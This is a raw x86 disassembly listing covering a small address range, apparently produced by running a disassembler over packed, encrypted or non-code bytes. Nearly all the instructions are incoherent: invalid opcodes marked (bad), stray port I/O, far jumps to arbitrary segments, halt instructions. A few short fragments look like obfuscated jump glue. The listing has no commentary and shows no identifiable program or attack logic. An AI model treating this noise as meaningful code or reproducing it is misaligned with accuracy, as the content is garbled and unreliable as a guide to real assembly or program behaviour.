  4156d3:	retf   
  4156d4:	aad    0xcc
  4156d6:	xchg   ebp,eax
  4156d7:	les    edx,FWORD PTR [edi-0x57]
  4156da:	shl    ah,0x13
  4156dd:	out    dx,al
  4156de:	dec    eax
  4156df:	clc    
  4156e0:	or     BYTE PTR [edi+0x2f31b6e],bl
  4156e6:	ja     0x41569e
  4156e8:	hlt    
  4156e9:	sahf   
  4156ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156eb:	popa   
  4156ec:	pop    esi
  4156ed:	hlt    
  4156ee:	es dec esi
  4156f0:	aam    0x92
  4156f2:	pop    eax
  4156f3:	sbb    DWORD PTR [eax-0x12f6ac24],ebp
  4156f9:	push   ecx
  4156fa:	cs inc esp
  4156fc:	pop    eax
  4156fd:	sbb    cl,ch
  4156ff:	fwait
  415700:	rcl    BYTE PTR [edi+0xb],cl
  415703:	or     eax,0xaad0b41e
  415708:	repnz sbb eax,0x6a1bd0af
  41570e:	xchg   esi,eax
  41570f:	mov    eax,ds:0x96c2fc66
  415714:	sub    edi,DWORD PTR [edx]
  415716:	(bad)  
  415717:	and    BYTE PTR [esi+ecx*4+0x58],bl
  41571b:	lods   eax,DWORD PTR ds:[esi]
  41571c:	jp     0x415732
  41571e:	(bad)  
  41571f:	scas   al,BYTE PTR es:[edi]
  415720:	dec    ebp
  415721:	sub    BYTE PTR [edi-0x6740fc57],al
  415727:	(bad)  
  415728:	shl    DWORD PTR [ecx-0x7],cl
  41572b:	(bad)  
  41572c:	pop    ebp
  41572d:	push   ds
  41572e:	imul   DWORD PTR [edi-0x20]
  415731:	jo     0x41571f
  415733:	sub    bh,bh
  415735:	adc    DWORD PTR [esi],ebx
  415737:	shl    dh,cl
  415739:	dec    esp
  41573a:	adc    al,0x3a
  41573c:	dec    BYTE PTR [ecx-0x17f19651]
  415742:	xor    BYTE PTR [eax-0x3f],dh
  415745:	add    ah,BYTE PTR [ecx+0xa]
  415748:	iret   
  415749:	repnz in al,0xdb
  41574c:	add    eax,0xc8dfb14e
  415751:	test   eax,0x48b50463
  415756:	out    0x6e,eax
  415758:	sbb    bh,BYTE PTR cs:[eax-0x6dea9526]
  41575f:	call   0xf333:0x9dfccd32
  415766:	mov    edx,0xd6d24c6b
  41576b:	inc    edx
  41576c:	mov    ebp,esi
  41576e:	(bad)  
  41576f:	dec    esi
  415770:	mov    ch,0x92
  415772:	aad    0xbc
  415774:	scas   eax,DWORD PTR es:[edi]
  415775:	in     eax,0xe7
  415777:	out    0x5c,al
  415779:	mov    ds:0xc1f25e0f,al
  41577e:	mov    WORD PTR [esi],ss
  415780:	ret    
  415781:	les    ebx,FWORD PTR [ebx+0x7b49730d]
  415787:	xor    bl,ch
  415789:	lods   eax,DWORD PTR ds:[esi]
  41578a:	mov    WORD PTR [eax],ss
  41578c:	and    ch,dh
  41578e:	adc    eax,0x10a68801
  415793:	test   ebp,ebp
  415795:	aaa    
  415796:	jge    0x4157ef
  415798:	add    al,0xcd
  41579a:	mov    esi,0x32729c
  41579f:	add    edi,esi
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   bh,bl
  4157b8:	or     eax,DWORD PTR [ebx+0x19]
  4157bb:	jg     0x4157cc
  4157bd:	jg     0x41582f
  4157bf:	mov    ecx,0xbe70707e
  4157c4:	inc    esp
  4157c5:	add    ecx,ebp
  4157c7:	inc    edi
  4157c8:	pop    edx
  4157c9:	cmp    bh,dl
  4157cb:	repz mov eax,0xbda8bd75
  4157d1:	push   edx
  4157d2:	sbb    dh,BYTE PTR [esi+0x65]
  4157d5:	xchg   ecx,eax
  4157d6:	cmp    al,0xe7
  4157d8:	aad    0xaf
  4157da:	mov    al,0x31
  4157dc:	cmp    BYTE PTR [eax+0x59],0xff
  4157e0:	xchg   ecx,eax
  4157e1:	xchg   ebx,eax
  4157e2:	push   ecx
  4157e3:	or     al,0x25
  4157e5:	int3   
  4157e6:	sub    al,0x1c
  4157e8:	pop    ss
  4157e9:	pop    ebp
  4157ea:	sbb    eax,0x9d2c30ce
  4157ef:	pop    ss
  4157f0:	mov    bh,0x33
  4157f2:	dec    edi
  4157f3:	retf   
  4157f4:	push   ds
  4157f5:	cmp    eax,edi
  4157f7:	xlat   BYTE PTR ds:[ebx]
  4157f8:	mov    eax,ds:0x7423285b
  4157fd:	hlt    
  4157fe:	sub    eax,0x4084d6ea
  415803:	and    cl,BYTE PTR [ebp+0x733e8287]
  415809:	jg     0x415835
  41580b:	push   esp
  41580c:	pop    esp
  41580d:	sub    al,dl
  41580f:	loope  0x4157d9
  415811:	fadd   DWORD PTR [eax]
  415813:	aaa    
  415814:	pop    ecx
  415815:	lahf   
  415816:	enter  0xdcce,0xea
  41581a:	ror    DWORD PTR [edx-0x75999196],cl
  415820:	push   ds
  415821:	in     eax,0xaa
  415823:	sahf   
  415824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415825:	jp     0x41582a
  415827:	clc    
  415828:	jl     0x4157ec
  41582a:	ret    0x6708
  41582d:	cmp    ebp,esi
  41582f:	sub    dl,cl
  415831:	popa   
  415832:	popf   
  415833:	and    al,0x6c
  415835:	int    0x1d
  415837:	ret    0x104
  41583a:	addr16 cmp eax,0xb0c9a6f8
  415840:	repnz cli 
  415842:	aaa    
  415843:	push   ebx
  415844:	push   esi
  415845:	out    0xa3,al
  415847:	mov    esi,0x18ebf890
  41584c:	pop    ebx
  41584d:	rcl    DWORD PTR [edx+ebx*8],0xb7
  415851:	loopne 0x41586a
  415853:	inc    ebx
  415854:	sahf   
  415855:	fisubr WORD PTR [esi+0x560d5361]
  41585b:	cdq    
  41585c:	sub    al,0xf4
  41585e:	sbb    al,0x64
  415860:	shr    bh,cl
  415862:	ins    BYTE PTR es:[edi],dx
  415863:	test   eax,edx
  415865:	ret    0xd754
  415868:	push   eax
  415869:	ss aad 0x7d
  41586c:	out    dx,al
  41586d:	mov    BYTE PTR [ecx+0x7],al
  415870:	(bad)  
  415871:	mov    esi,0x18bff2ed
  415876:	stos   BYTE PTR es:[edi],al
  415877:	dec    esp
  415878:	scas   al,BYTE PTR es:[edi]
  415879:	sbb    eax,0x8ee389da
  41587e:	aas    
  41587f:	out    dx,al
  415880:	retf   0xf3ed
  415883:	mov    ah,0xbb
  415885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415886:	in     al,dx
  415887:	inc    edx
  415888:	and    al,0x38
  41588a:	push   ebx
  41588b:	cmp    eax,0x719fe06d
  415890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415891:	fdiv   st,st(4)
  415893:	rcl    edx,1
  415895:	pop    ds
  415896:	mov    ss,WORD PTR [eax]
  415898:	push   esp
  415899:	jmp    0x41584e
  41589b:	pop    edi
  41589c:	or     eax,0x5cc165ca
  4158a1:	scas   al,BYTE PTR es:[edi]
  4158a2:	push   eax
  4158a3:	mov    ebx,0xe45eb7a9
  4158a8:	(bad)  
  4158a9:	icebp  
  4158aa:	xor    al,0xe1
  4158ac:	ret    0xe28c
  4158af:	jg     0x41587b
  4158b1:	test   eax,0x3e6dd985
  4158b6:	pop    ebp
  4158b7:	mov    esi,0x8a11ef8b
  4158bc:	sub    esi,DWORD PTR ds:0x95b263f9
  4158c2:	daa    
  4158c3:	sbb    ebx,DWORD PTR ds:0x5a688a69
  4158c9:	lods   eax,DWORD PTR ds:[esi]
  4158ca:	adc    DWORD PTR [ebp-0x70ce103],esi
  4158d0:	fsubr  DWORD PTR [edx+esi*2-0x9]
  4158d4:	ja     0x4158ac
  4158d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158d7:	ret    0x69b3
  4158da:	frstor [edx-0x5205db7d]
  4158e0:	loop   0x4158e0
  4158e2:	xchg   edx,eax
  4158e3:	jge    0x4158f4
  4158e5:	and    DWORD PTR [ecx+0x51130927],ebp
  4158eb:	xor    BYTE PTR [eax+0x1f],bh
  4158ee:	add    bh,0x95
  4158f1:	xchg   ebx,eax
  4158f2:	pusha  
  4158f3:	fs adc al,bh
  4158f6:	sbb    ch,BYTE PTR [ebx]
  4158f8:	xchg   esp,eax
  4158f9:	xchg   ecx,eax
  4158fa:	ins    DWORD PTR es:[edi],dx
  4158fb:	push   esi
  4158fc:	outs   dx,DWORD PTR ds:[esi]
  4158fd:	or     DWORD PTR [edi-0x9],ebp
  415900:	cld    
  415901:	cmp    BYTE PTR [edi+0x17],cl
  415904:	jnp    0x415917
  415906:	aam    0xd7
  415908:	mov    ebx,0x8afe326f
  41590d:	sbb    DWORD PTR [ebx+0x19],0xd9610c3f
  415914:	or     esp,DWORD PTR [edx+0x21]
  415917:	push   ecx
  415918:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41591a:	add    al,0xa9
  41591c:	in     al,0x37
  41591e:	dec    esi
  41591f:	out    dx,al
  415920:	mov    bl,0xc5
  415922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415923:	mov    ds:0x9d00b821,eax
  415928:	xchg   ecx,eax
  415929:	hlt    
  41592a:	ror    BYTE PTR [edi+eiz*1+0x9cc19aa],cl
  415931:	sub    bh,BYTE PTR [edx]
  415933:	jle    0x41598e
  415935:	(bad)  
  415936:	xlat   BYTE PTR ds:[ebx]
  415937:	dec    ebx
  415938:	sbb    BYTE PTR [ebp-0x5d],dh
  41593b:	or     bh,bh
  41593d:	in     eax,dx
  41593e:	mov    edx,0x67bc8b0d
  415943:	mov    bh,0x83
  415945:	cmp    eax,0x9a137990
  41594a:	xchg   ebp,eax
  41594b:	leave  
  41594c:	jl     0x4158fc
  41594e:	fcmovbe st,st(4)
  415950:	es gs add al,0x18
  415954:	and    al,0x3b
  415956:	pop    esi
  415957:	fisttp DWORD PTR [eax+ecx*1+0x76]
  41595b:	jp     0x41591c
  41595d:	(bad)  
  41595e:	fidivr DWORD PTR [edx-0x3a]
  415961:	cmp    al,0xf3
  415963:	push   ds
  415964:	sbb    DWORD PTR [eax+0x67],edi
  415967:	arpl   WORD PTR [edx+0x75],cx
  41596a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41596b:	jmp    0x99a8:0xef66d3ea
  415972:	mov    es,WORD PTR [esi]
  415974:	retf   
  415975:	into   
  415976:	jge    0x415918
  415978:	xor    dl,BYTE PTR [ebp-0x5b]
  41597b:	cdq    
  41597c:	test   eax,ebp
  41597e:	test   esi,ebx
  415980:	add    esp,DWORD PTR [esi+edi*2]
  415983:	mov    ecx,DWORD PTR [edx+0x3d6dee6b]
  415989:	rcr    BYTE PTR [edx+0x44b56d7f],cl
  41598f:	sub    eax,0xeb111001
  415994:	dec    ebp
  415995:	out    0xb6,eax
  415997:	enter  0xe64,0x1b
  41599b:	sar    DWORD PTR [eax-0x46a01ece],0xb8
  4159a2:	mov    bl,0x9d
  4159a4:	(bad)  
  4159a5:	jo     0x41595a
  4159a7:	neg    DWORD PTR [esi+eax*2]
  4159aa:	mov    al,ds:0x676b36dd
  4159af:	mov    ds:0x2ad9ee01,al
  4159b4:	stc    
  4159b5:	pop    esi
  4159b6:	mov    ebx,0xf19e04cf
  4159bb:	inc    ecx
  4159bc:	fwait
  4159bd:	inc    ebx
  4159be:	hlt    
  4159bf:	mov    bh,0x11
  4159c1:	in     eax,0x75
  4159c3:	xor    al,0xef
  4159c5:	add    al,0xa0
  4159c7:	shl    BYTE PTR [esi],cl
  4159c9:	test   BYTE PTR [edx],al
  4159cb:	jo     0x41594f
  4159cd:	mov    edi,0x3a763014
  4159d2:	scas   eax,DWORD PTR es:[edi]
  4159d3:	inc    esi
  4159d4:	imul   ebx,DWORD PTR [edi],0x6b
  4159d7:	mov    edx,0xd32e225d
  4159dc:	mov    dl,BYTE PTR [ebx-0x5e38979f]
  4159e2:	imul   esp,DWORD PTR [ebx],0xfffffffc
  4159e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159e6:	imul   ecx,DWORD PTR [eax-0x76],0x3
  4159ea:	jbe    0x415984
  4159ec:	or     ch,BYTE PTR [edi+0xc3cef22]
  4159f2:	or     ebx,DWORD PTR [eax-0x6301a32d]
  4159f8:	inc    ebx
  4159f9:	in     eax,dx
  4159fa:	inc    esp
  4159fb:	jb     0x4159e2
  4159fd:	ffreep st(6)
  4159ff:	pop    edi
  415a00:	fsubr  st,st(2)
  415a02:	jmp    0xca5d5540
  415a07:	and    dl,BYTE PTR [ebp+0x33ae1c68]
  415a0d:	les    ebp,FWORD PTR [ecx-0x33d76c8a]
  415a13:	and    eax,0x2fe98dea
  415a18:	fld    QWORD PTR [eax-0x3b637481]
  415a1e:	and    DWORD PTR [ebx+0x6fa97d92],eax
  415a24:	cmp    ah,bl
  415a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a27:	fimul  DWORD PTR [esi]
  415a29:	mov    ebx,0x9ab64340
  415a2e:	fwait
  415a2f:	mov    fs:0xddb7dd08,eax
  415a35:	retf   
  415a36:	mov    ecx,0xdd76c98d
  415a3b:	add    BYTE PTR [edi+0x620720c6],bh
  415a41:	imul   edx,ebx,0x12f5e4eb
  415a47:	mov    al,ds:0xb71e11c9
  415a4c:	ins    DWORD PTR es:[edi],dx
  415a4d:	or     BYTE PTR [edx+0x19db5470],dl
  415a53:	jmp    0x3c0499b1
  415a58:	int    0xaa
  415a5a:	and    BYTE PTR [ebx-0x62d768ae],0x2
  415a61:	(bad)  
  415a62:	scas   eax,DWORD PTR es:[edi]
  415a63:	imul   esi,ebx,0xd2a3307b
  415a69:	or     DWORD PTR [esi],eax
  415a6b:	pop    ecx
  415a6c:	push   0xfde3f079
  415a71:	add    BYTE PTR [esi],dh
  415a73:	outs   dx,DWORD PTR ds:[esi]
  415a74:	daa    
  415a75:	cs (bad) 
  415a77:	icebp  
  415a78:	enter  0x5b04,0x7e
  415a7c:	and    bl,dh
  415a7e:	outs   dx,BYTE PTR ds:[esi]
  415a7f:	shr    esp,1
  415a81:	cmp    ebx,DWORD PTR [eax]
  415a83:	in     al,0x36
  415a85:	jge    0x415a1f
  415a87:	fild   WORD PTR [edx+0x2b]
  415a8a:	xor    edx,ecx
  415a8c:	lea    eax,[edx+eax*1+0x32729c]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	dec    esi
  415aa5:	pop    ebx
  415aa6:	mov    ah,0xc0
  415aa8:	mov    eax,0xb9707f0d
  415aad:	jle    0x415b1f
  415aaf:	jo     0x415aa2
  415ab1:	jle    0x415a3f
  415ab3:	push   esp
  415ab4:	fs mov edi,0x31b701e1
  415aba:	push   cs
  415abb:	inc    esi
  415abc:	aas    
  415abd:	xlat   BYTE PTR ds:[ebx]
  415abe:	test   BYTE PTR [edi+0x78],bl
  415ac1:	shl    BYTE PTR [esi+esi*2],1
  415ac4:	mov    al,ds:0x4115f5be
  415ac9:	pop    esi
  415aca:	pusha  
  415acb:	xchg   edi,eax
  415acc:	cdq    
  415acd:	in     al,0x9a
  415acf:	mov    ebp,0xdb1197d
  415ad4:	dec    ebp
  415ad5:	out    dx,al
  415ad6:	or     BYTE PTR [ecx-0x72],ch
  415ad9:	(bad)  
  415ada:	(bad)  [ecx-0x38]
  415add:	jp     0x415ae9
  415adf:	mov    ah,0x73
  415ae1:	mov    dh,0x58
  415ae3:	dec    esp
  415ae4:	in     al,0x24
  415ae6:	hlt    
  415ae7:	push   cs
  415ae8:	lock xchg DWORD PTR [edx+0x6ecd9474],esi
  415aef:	(bad)  
  415af1:	jecxz  0x415ab4
  415af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415af4:	out    0x2d,al
  415af6:	std    
  415af7:	repnz ins DWORD PTR es:[edi],dx
  415af9:	jmp    0xe015a329
  415afe:	call   0x6ea3ce24
  415b03:	outs   dx,BYTE PTR ds:[esi]
  415b04:	div    dl
  415b06:	sbb    edx,DWORD PTR [ecx-0x1815c539]
  415b0c:	push   cs
  415b0d:	retf   
  415b0e:	mov    al,ds:0xe6f5142b
  415b13:	sub    eax,0x12d102c6
  415b18:	pop    esp
  415b19:	pandn  mm1,QWORD PTR [ecx+0x388ccb86]
  415b20:	stos   DWORD PTR es:[edi],eax
  415b21:	cmc    
  415b22:	sahf   
  415b23:	adc    al,0x4c
  415b25:	repnz adc ah,BYTE PTR [eax+0x23]
  415b29:	and    esi,DWORD PTR [ebp-0x28]
  415b2c:	mov    ds:0xc25323d8,eax
  415b31:	pop    ss
  415b32:	push   ebp
  415b33:	and    DWORD PTR ds:0x1b4b0d22,ebx
  415b39:	mov    bl,0xae
  415b3b:	pop    ds
  415b3c:	(bad)  
  415b3d:	jmp    0x341f:0xda1891ee
  415b44:	lea    ebp,[edx+esi*4-0x666a8fbe]
  415b4b:	loop   0x415bab
  415b4d:	cdq    
  415b4e:	cmp    BYTE PTR [edi+0x2e],ch
  415b51:	out    0x5d,eax
  415b53:	call   0x9bc2ad3e
  415b58:	push   ebx
  415b59:	mov    dh,0xea
  415b5b:	stos   BYTE PTR es:[edi],al
  415b5c:	lahf   
  415b5d:	or     BYTE PTR [ebx+0x3d],bl
  415b60:	push   edi
  415b61:	and    eax,DWORD PTR [ebp-0x4b]
  415b64:	pusha  
  415b65:	and    ah,BYTE PTR [edx+0x5e7c484f]
  415b6b:	push   ebx
  415b6c:	(bad)  
  415b6e:	xchg   ebx,edi
  415b70:	loope  0x415b4a
  415b72:	call   FWORD PTR [esi]
  415b74:	fs xchg ebx,eax
  415b76:	pop    esp
  415b77:	scas   eax,DWORD PTR es:[edi]
  415b78:	sub    DWORD PTR [ecx+0x7d],0xffffffab
  415b7c:	cmp    eax,0xfec025a
  415b81:	mov    bh,0xbb
  415b83:	fisub  DWORD PTR [ecx+0x43e0e3d5]
  415b89:	dec    esp
  415b8a:	ins    DWORD PTR es:[edi],dx
  415b8b:	icebp  
  415b8c:	push   edx
  415b8d:	push   edi
  415b8e:	js     0x415ba6
  415b90:	add    al,0xa9
  415b92:	sub    BYTE PTR [esi],dh
  415b94:	or     al,0x42
  415b96:	inc    ebx
  415b97:	mov    edi,0xf0ffb2d4
  415b9c:	xor    ecx,esp
  415b9e:	(bad)  
  415b9f:	fwait
  415ba0:	scas   eax,DWORD PTR es:[edi]
  415ba1:	mov    BYTE PTR [ebp-0x2e],ch
  415ba4:	ss adc esp,esi
  415ba7:	inc    esi
  415ba8:	add    eax,0x48a5530a
  415bad:	arpl   WORD PTR [edi+0x65],bp
  415bb0:	jno    0x415c0a
  415bb2:	out    0x43,al
  415bb4:	dec    ebp
  415bb5:	pop    es
  415bb6:	fwait
  415bb7:	xor    BYTE PTR [eax],dl
  415bb9:	imul   eax,eax,0x41
  415bbc:	shr    BYTE PTR [ebp+0x1],cl
  415bbf:	push   ss
  415bc0:	push   edx
  415bc1:	js     0x415bf1
  415bc3:	das    
  415bc4:	stos   BYTE PTR es:[edi],al
  415bc5:	clc    
  415bc6:	cmp    esp,DWORD PTR [ebx]
  415bc8:	popa   
  415bc9:	mov    BYTE PTR [edx+0x27779800],dl
  415bcf:	xchg   ecx,eax
  415bd0:	sbb    ch,BYTE PTR [edi]
  415bd2:	lods   al,BYTE PTR ds:[esi]
  415bd3:	rcr    BYTE PTR [edi-0x40d94bbe],1
  415bd9:	mov    DWORD PTR [esp+edi*2],esi
  415bdc:	mov    al,0x44
  415bde:	cwde   
  415bdf:	test   BYTE PTR [edx+0x71a0bbc0],0xdf
  415be6:	adc    DWORD PTR [edi],ebx
  415be8:	sub    bh,bl
  415bea:	dec    edx
  415beb:	push   es
  415bec:	jae    0x415c19
  415bee:	xchg   ebx,eax
  415bef:	push   eax
  415bf0:	push   esp
  415bf1:	fistp  WORD PTR [ecx-0x1ea94667]
  415bf7:	test   BYTE PTR [ebp-0x40879214],cl
  415bfd:	pusha  
  415bfe:	and    DWORD PTR [ecx+eax*4+0x72],edi
  415c02:	xor    dh,BYTE PTR [ebp+0xfc01c38]
  415c08:	retf   0xda84
  415c0b:	add    DWORD PTR [ecx],edi
  415c0d:	push   ebx
  415c0e:	jmp    0xb408:0xabd79b2e
  415c15:	xchg   BYTE PTR [edi-0x7a920f6],al
  415c1b:	dec    esp
  415c1c:	push   ds
  415c1d:	leave  
  415c1e:	loopne 0x415c02
  415c20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c21:	pop    ecx
  415c22:	xor    eax,0x74993391
  415c27:	scas   eax,DWORD PTR es:[edi]
  415c28:	push   edx
  415c29:	mov    ah,0xa6
  415c2b:	pop    ds
  415c2c:	jmp    0xfe535095
  415c31:	mov    ebx,0xda6c2488
  415c36:	mov    ds:0xd3d108d6,al
  415c3b:	xchg   BYTE PTR [edx+0x2a2c1a5e],dl
  415c41:	inc    esi
  415c42:	ins    DWORD PTR es:[edi],dx
  415c43:	push   ebx
  415c44:	and    dl,ch
  415c46:	idiv   BYTE PTR [edi-0x72]
  415c49:	xor    esi,DWORD PTR [ebx-0x2d773e11]
  415c4f:	std    
  415c50:	fidiv  DWORD PTR ds:[ebx+edi*2]
  415c54:	in     eax,0xe9
  415c56:	add    BYTE PTR [edi],0x65
  415c59:	nop
  415c5a:	adc    BYTE PTR [eax-0x3af9554b],0x69
  415c61:	jge    0x415c20
  415c63:	pop    si
  415c65:	jle    0x415bf4
  415c67:	inc    ebx
  415c68:	xchg   edx,eax
  415c69:	and    al,0xfc
  415c6b:	call   0x15d4:0xb338c3be
  415c72:	xchg   edx,eax
  415c73:	pushf  
  415c74:	(bad)  
  415c75:	sti    
  415c76:	ja     0x415ca3
  415c78:	ficom  DWORD PTR [edi]
  415c7a:	call   0x17af40a4
  415c7f:	pop    es
  415c80:	in     eax,0xe5
  415c82:	outs   dx,BYTE PTR ds:[esi]
  415c83:	pop    ss
  415c84:	nop
  415c85:	add    DWORD PTR [ebx-0x29dcc5ae],0x988f6ff4
  415c8f:	sahf   
  415c90:	lahf   
  415c91:	in     eax,dx
  415c92:	mov    dh,0xed
  415c94:	xchg   esp,eax
  415c95:	sub    DWORD PTR [esi],ecx
  415c97:	mov    ebp,0x403878c3
  415c9c:	pop    ss
  415c9d:	cmp    DWORD PTR [eax],edi
  415c9f:	in     al,0xa4
  415ca1:	cld    
  415ca2:	jbe    0x415c5f
  415ca4:	(bad)  
  415ca6:	ins    BYTE PTR es:[edi],dx
  415ca7:	adc    DWORD PTR [ebx+0x70],eax
  415caa:	pop    edi
  415cab:	je     0x415d24
  415cad:	sub    DWORD PTR [ebx-0x57eb8ce],0xb69d3b8a
  415cb7:	jno    0x415d30
  415cb9:	xor    edx,DWORD PTR [edx+0x74]
  415cbc:	cmp    BYTE PTR [esi],al
  415cbe:	sbb    bl,BYTE PTR es:[eax+0x3e3d92ab]
  415cc5:	fnstenv [edi+0x13b26391]
  415ccb:	sub    bh,ch
  415ccd:	or     bl,0x78
  415cd0:	xchg   edx,eax
  415cd1:	inc    BYTE PTR [ebp+edx*8+0x7325c24e]
  415cd8:	adc    DWORD PTR [edx-0x2d180fad],ebx
  415cde:	nop
  415cdf:	aas    
  415ce0:	hlt    
  415ce1:	repz sub cl,BYTE PTR [edi+0x55]
  415ce5:	(bad)  
  415ce6:	(bad)  
  415ce8:	or     ecx,esi
  415cea:	adc    BYTE PTR [eax+0x4be24835],dl
  415cf0:	or     dh,ah
  415cf2:	pop    ebp
  415cf3:	push   esp
  415cf4:	aam    0xbb
  415cf6:	frstor [edi+0x4a]
  415cf9:	retf   0x6539
  415cfc:	sub    edi,DWORD PTR gs:[edx]
  415cff:	pop    ss
  415d00:	loop   0x415ca5
  415d02:	retf   0x84b4
  415d05:	pop    ebp
  415d06:	fs aad 0x7d
  415d09:	jl     0x415d3e
  415d0b:	ds out 0x44,eax
  415d0e:	xor    DWORD PTR [ecx],ecx
  415d10:	jae    0x415cf6
  415d12:	dec    esi
  415d13:	pop    ss
  415d14:	and    bh,BYTE PTR [edi-0x4d]
  415d17:	mov    ch,0x30
  415d19:	push   esi
  415d1a:	retf   
  415d1b:	push   eax
  415d1c:	cwde   
  415d1d:	xor    al,0x5c
  415d1f:	repnz retf 
  415d21:	popa   
  415d22:	lea    ecx,[edi+0x283a6f0c]
  415d28:	mov    BYTE PTR [esp+edi*8-0x66515a97],cl
  415d2f:	add    ch,BYTE PTR ss:[eax]
  415d32:	adc    bl,BYTE PTR [ebp+0x6f9321a]
  415d38:	aad    0xa3
  415d3a:	popf   
  415d3b:	arpl   WORD PTR [edi-0x42],sp
  415d3e:	ss sar eax,cl
  415d41:	mov    ds:0xbdf8a1b,eax
  415d46:	pop    edi
  415d47:	jle    0x415d81
  415d49:	jns    0x415d25
  415d4b:	xchg   ebp,eax
  415d4c:	ror    edi,0xd8
  415d4f:	fcom   DWORD PTR [eax-0x3e865d2f]
  415d55:	sbb    DWORD PTR gs:0xceb1bec8,edi
  415d5c:	adc    al,0xc9
  415d5e:	lds    ecx,FWORD PTR [ecx-0x510ead2]
  415d64:	mov    ds:0x286b2cb6,eax
  415d69:	mov    ebx,0x2ccb8e63
  415d6e:	in     eax,0x82
  415d70:	pusha  
  415d71:	repnz and DWORD PTR [eax],ebp
  415d74:	add    ch,BYTE PTR [eax+0xe]
  415d77:	mov    edx,DWORD PTR [ebp+0x8]
  415d7a:	mov    edi,DWORD PTR [ebp-0x24]
  415d7d:	mov    DWORD PTR [edi+edx*4],eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	ret    0x41f4
  415d97:	and    BYTE PTR [ecx-0x468f80f6],al
  415d9d:	jle    0x415e0f
  415d9f:	jo     0x415e12
  415da1:	inc    esi
  415da2:	jns    0x415e14
  415da4:	mov    al,ds:0x536c2936
  415da9:	sub    ch,cl
  415dab:	xor    edx,DWORD PTR [ebp-0xb]
  415dae:	aas    
  415daf:	and    al,dl
  415db1:	jo     0x415d76
  415db3:	and    dl,BYTE PTR [ebx+0x5ccc99ba]
  415db9:	mov    ecx,0xd1e1195d
  415dbe:	retf   
  415dbf:	or     al,BYTE PTR [ebp-0x17]
  415dc2:	inc    ebx
  415dc3:	sti    
  415dc4:	mov    esp,0x88433518
  415dc9:	push   cs
  415dca:	push   0x5a
  415dcc:	xor    eax,0xdf9e80dd
  415dd1:	fsub   QWORD PTR [ebx-0x29]
  415dd4:	je     0x415e3c
  415dd6:	push   DWORD PTR [edx+0x5d]
  415dd9:	add    bh,BYTE PTR [eax-0x3be27057]
  415ddf:	mov    dl,0xcc
  415de1:	loop   0x415e23
  415de3:	int3   
  415de4:	fwait
  415de5:	and    ebp,ecx
  415de7:	pop    edi
  415de8:	push   edx
  415de9:	test   BYTE PTR [esp+edi*4+0x53746fd],dh
  415df0:	push   eax
  415df1:	fmul   DWORD PTR [ecx+ecx*8]
  415df4:	pop    ds
  415df5:	sbb    eax,0x3f7d2d50
  415dfa:	cmp    cl,BYTE PTR [edx-0x49]
  415dfd:	inc    edi
  415dfe:	ins    DWORD PTR es:[edi],dx
  415dff:	mov    ?,WORD PTR [ebx-0x53c20618]
  415e05:	call   0xbfa603ac
  415e0a:	(bad)  
  415e0c:	pop    es
  415e0d:	jbe    0x415dc9
  415e0f:	pop    ds
  415e10:	sbb    eax,0x3a9a6446
  415e15:	push   ebp
  415e16:	out    dx,al
  415e17:	push   ds
  415e18:	jp     0x415e55
  415e1a:	adc    al,0x42
  415e1c:	jne    0x415df7
  415e1e:	cmp    cl,BYTE PTR [ebx+0x71]
  415e21:	push   ss
  415e22:	add    bh,cl
  415e24:	pop    es
  415e25:	arpl   WORD PTR [edx],dx
  415e27:	(bad)  
  415e28:	sti    
  415e29:	jo     0x415e87
  415e2b:	sub    bl,BYTE PTR [edx-0x73]
  415e2e:	out    dx,al
  415e2f:	mov    BYTE PTR [esp+ebx*2],dh
  415e32:	jbe    0x415e3d
  415e34:	jle    0x415e2c
  415e36:	cmp    bl,BYTE PTR [esi+0x52ae66b2]
  415e3c:	jecxz  0x415ebb
  415e3e:	xor    ah,bh
  415e40:	pop    ebp
  415e41:	ficom  WORD PTR [ebx+eax*1]
  415e44:	hlt    
  415e45:	mov    ds:0x1823379,al
  415e4a:	dec    edi
  415e4b:	imul   eax,DWORD PTR [ebp-0x36],0xc19226ee
  415e52:	sub    al,0xc0
  415e54:	in     eax,0xf
  415e56:	push   edi
  415e57:	nop
  415e58:	adc    esp,DWORD PTR [ebp-0xf1bea32]
  415e5e:	mov    esi,0x42de1152
  415e63:	stc    
  415e64:	jo     0x415e80
  415e66:	dec    esp
  415e67:	aam    0xdf
  415e69:	inc    edx
  415e6a:	xor    DWORD PTR [eax+0x3c],eax
  415e6d:	xor    BYTE PTR [esi+0x6e],dh
  415e70:	test   al,0xac
  415e72:	xor    eax,0xdcfd3228
  415e77:	inc    edi
  415e78:	stc    
  415e79:	test   al,0xf7
  415e7b:	jns    0x415ecc
  415e7d:	pop    ebp
  415e7e:	hlt    
  415e7f:	dec    ecx
  415e80:	cmp    ch,BYTE PTR [ebp-0x549d9a1]
  415e86:	adc    BYTE PTR [eax+0x1f],ch
  415e89:	xchg   edx,eax
  415e8a:	in     eax,dx
  415e8b:	add    ecx,eax
  415e8d:	push   0x17dcf3d2
